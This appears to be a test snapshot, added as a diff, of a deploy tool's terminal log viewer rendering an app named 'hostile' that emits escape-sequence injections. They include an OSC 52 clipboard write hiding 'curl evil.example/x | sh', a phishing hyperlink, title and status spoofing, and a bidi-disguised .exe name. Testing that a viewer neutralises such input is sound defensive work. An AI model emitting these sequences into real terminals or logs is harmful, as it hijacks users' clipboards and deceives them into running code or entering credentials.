@@ -1,0 +1,24 @@
+✖ 2 firing · motel · deploy.example.com · v0.7.0 │ alice@example.… live · 0s ago
+apps › hostile › logs                                as of 14:12:40 UTC · 0s ago
+── following: a read every 2 s ─────────────────────────────────────────────────
+-- 2026-11-15 UTC, release v6 --
+14:07:40  listening on :8080
+14:07:50  osc52 \x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\x07 copied
+14:08:00  osc8 \x1b]8;;https://evil.example/login\x1b\motel login\x1b]8;;\x1b\
+14:08:10  title \x1b]0;motel: all healthy\x07 csi \x1b[5A\x1b[2K\x1b[10C clear
+          \x1b[2J\x1b[H
+14:08:20  bidi \u202elmth.exe\u202c c1 \u009b31m dcs \x1bPtmux;\x1b\x1b]52;c;Y3V
+          ybA==\x07\x1b\ apc \x1b_Gf=100,a=T;AAAA\x1b\
+14:08:30  tags [red]FAKE[-] ["region"]hidden[""] [::b]bold[::-] [green]healthy[-
+          ] [:::https://evil.example/tag]motel login[:::-]
+14:08:40  carriage\x0dreturn      tab\x0anewline \u2028 separator 👍 \U0001f3fd-0
+14:08:50  -- 2026-11-15 UTC, release v7 --
+14:09:00  padded to wrap:
+                                                                           14:12
+          :40  a line of its own?
+14:09:10  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+          xxxxxxxxxxxxxxxxxxxx
+↑↓ scroll  End follow  w wrap  c cmd  esc back  ? more
